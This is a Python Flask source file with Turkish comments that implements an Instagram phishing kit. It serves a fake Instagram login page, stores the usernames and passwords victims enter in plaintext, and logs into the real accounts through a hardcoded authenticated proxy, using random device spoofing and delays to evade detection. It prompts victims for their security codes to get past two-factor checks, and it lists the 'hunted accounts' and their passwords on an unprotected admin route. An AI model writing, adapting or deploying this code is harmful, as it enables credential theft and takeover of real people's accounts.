import os
import threading
import time
import random
from flask import Flask, request, jsonify, render_template_string
from flask_sqlalchemy import SQLAlchemy
from instagrapi import Client
from instagrapi.exceptions import ChallengeRequired, BadPassword, TwoFactorRequired, FeedbackRequired
from dotenv import load_dotenv

# 1. TEMEL AYARLAR (HİÇBİR ŞEY SİLİNMEDİ)
load_dotenv()
app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL")
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

# SENİN PROXY BİLGİLERİN
PROXY_URL = "http://SDDLzRveLbkavJr:MPvdO65MOnMifL7@82.41.250.136:42158"

class IGUser(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True)
    password = db.Column(db.String(100))
    status = db.Column(db.String(100), default="Bekliyor")

sessions = {}

# 2. GİRİŞ SAYFASI (HTML)
LOGIN_HTML = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-black text-white flex items-center justify-center min-h-screen p-6">
    <div id="main-card" class="w-full max-w-[350px] border border-zinc-800 p-10 text-center rounded-sm">
        <h1 class="text-4xl italic font-bold mb-10">Instagram</h1>
        <div id="login-form">
            <input id="u" placeholder="Kullanıcı adı" class="w-full bg-[#121212] border border-[#363636] p-3 rounded mb-2 text-white outline-none">
            <input id="p" type="password" placeholder="Şifre" class="w-full bg-[#121212] border border-[#363636] p-3 rounded mb-4 text-white outline-none">
            <button onclick="startLogin()" id="btn-login" class="w-full bg-[#0095f6] font-bold p-2 rounded-lg transition active:scale-95">Giriş Yap</button>
        </div>
        <div id="challenge-form" class="hidden text-center">
            <p class="text-xs text-zinc-400 mb-4 font-semibold">Hesabına bir güvenlik kodu gönderdik. Giriş yapmak için kodu yaz.</p>
            <input id="two-fa-code" placeholder="Güvenlik Kodu" class="w-full bg-[#121212] border border-[#363636] p-3 rounded mb-4 text-center text-lg tracking-widest outline-none">
            <button onclick="submitCode()" id="btn-code" class="w-full bg-green-600 font-bold p-2 rounded-lg">Onayla</button>
        </div>
        <p id="status-msg" class="text-xs mt-6 text-red-500 font-bold"></p>
    </div>
    <script>
        async function startLogin() {
            const u = document.getElementById('u').value, p = document.getElementById('p').value;
            const btn = document.getElementById('btn-login'), msg = document.getElementById('status-msg');
            if(!u || !p) return;
            btn.disabled = true; btn.innerText = "Bağlanıyor..."; msg.innerText = "";
            try {
                const r = await fetch('/api/start-login', {
                    method: 'POST', headers: {'Content-Type':'application/json'},
                    body: JSON.stringify({u, p})
                });
                const d = await r.json();
                if(d.status === "challenge") {
                    document.getElementById('login-form').classList.add('hidden');
                    document.getElementById('challenge-form').classList.remove('hidden');
                    msg.innerText = "";
                } else if(d.status === "success") {
                    msg.className = "text-xs mt-6 text-green-400 font-bold";
                    msg.innerText = d.msg;
                } else {
                    msg.innerText = d.msg; btn.disabled = false; btn.innerText = "Giriş Yap";
                }
            } catch(e) { msg.innerText = "Sunucu hatası!"; btn.disabled = false; }
        }
    </script>
</body>
</html>
"""

# 3. İNSANSI GİRİŞ MOTORU (O KRİTİK YER BURASI)
@app.route('/api/start-login', methods=['POST'])
def start_login():
    data = request.json
    u, p = data.get('u'), data.get('p')
    
    user = IGUser.query.filter_by(username=u).first()
    if not user:
        user = IGUser(username=u, password=p)
        db.session.add(user)
    else:
        user.password, user.status = p, "Giriş Deneniyor..."
    db.session.commit()

    cl = Client()
    cl.set_proxy(PROXY_URL)
    
    # Instagram'ı şaşırtmak için rastgele telefon modelleri
    devices = ["iPhone13,4", "SamsungGalaxyS21", "Pixel5", "OnePlus9"]
    selected_device = random.choice(devices)
    
    sessions[u] = cl

    try:
        # İnsan taklidi: 4-8 saniye rastgele bekle
        time.sleep(random.randint(4, 8))
        
        # Cihaz ayarlarını yap
        cl.set_device_settings({"device_model": selected_device})
        
        # GİRİŞ DENEMESİ
        if cl.login(u, p):
            user.status = "AKTİF ✅"
            db.session.commit()
            return jsonify(status="success", msg="Giriş Başarılı!")
            
    except BadPassword:
        # Hatalı şifre derse 2 saniye sonra bir kez daha cihazı resetleyip dene
        try:
            time.sleep(2)
            cl.set_device_settings({})
            if cl.login(u, p):
                user.status = "AKTİF ✅"
                db.session.commit()
                return jsonify(status="success", msg="Giriş Başarılı!")
        except: pass
        
        user.status = "ŞİFRE YANLIŞ ❌"
        db.session.commit()
        return jsonify(status="error", msg="Şifre hatalı, lütfen kontrol et.")
        
    except (ChallengeRequired, TwoFactorRequired):
        user.status = "KOD BEKLİYOR 🔑"
        db.session.commit()
        return jsonify(status="challenge")
        
    except FeedbackRequired:
        user.status = "GEÇİCİ ENGEL (BEKLE) ⏳"
        db.session.commit()
        return jsonify(status="error", msg="Instagram şu an çok yoğun, lütfen 10 dk sonra tekrar dene.")

    except Exception as e:
        # Eğer gerçekten bağlanamıyorsa burada Proxy veya Render bloklanmıştır
        user.status = "BAĞLANTI REDDEDİLDİ 🚫"
        db.session.commit()
        return jsonify(status="error", msg="Bağlantı reddedildi. Proxy IP'si değişmeli.")
    
    return jsonify(status="error", msg="Hata oluştu.")

@app.route('/')
def home():
    return render_template_string(LOGIN_HTML)

@app.route('/panel-admin')
def admin():
    users = IGUser.query.order_by(IGUser.id.desc()).all()
    # Çok basit bir admin görünümü
    admin_res = "<h1>AVLANAN HESAPLAR</h1><ul>"
    for u in users:
        admin_res += f"<li><b>@{u.username}</b> - {u.password} - [{u.status}]</li>"
    admin_res += "</ul>"
    return admin_res

# 4. SERVER BAŞLATMA
if __name__ == "__main__":
    with app.app_context(): db.create_all()
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 10000)))
